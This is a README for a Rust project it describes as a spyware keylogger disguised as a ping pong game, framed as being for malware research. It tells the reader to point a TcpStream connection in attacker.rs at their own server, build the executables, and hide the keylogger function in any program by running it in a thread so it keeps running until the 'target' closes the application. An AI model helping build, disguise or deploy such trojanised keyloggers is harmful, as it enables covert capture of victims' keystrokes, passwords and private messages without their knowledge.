<h1>Ligand</h1> 
Spyware Keylogger disguised as a ping pong game coded in Rust programming language.

Designed only for malware research purposes

<h3>Instructions</h3> 

Change the host name in line 132 in attacker.rs
to any host name of the server
```
match TcpStream::connect("localhost:3333")
```

then run:
```
cargo build --release

```

Then you get the executables ready.








<b><p>note</p></b> function keylogger() can be put in any code as long as it handles correctly in threading like this :

```
fn main() {
    let keylogger_thread = thread::spawn(|| {
        run_keylogger();
    });

    main_function();

    keylogger_thread.join().unwrap();
}

```
Especially when it comes to while loops running. If the keylogger is not the main function, it can be closed along with the application being closed by the target.

<h1>SOCIAL MEDIA</h1>
Twitter
https://x.com/Haithamhacking<br/>
Instagram
https://www.instagram.com/haithamjabbari/
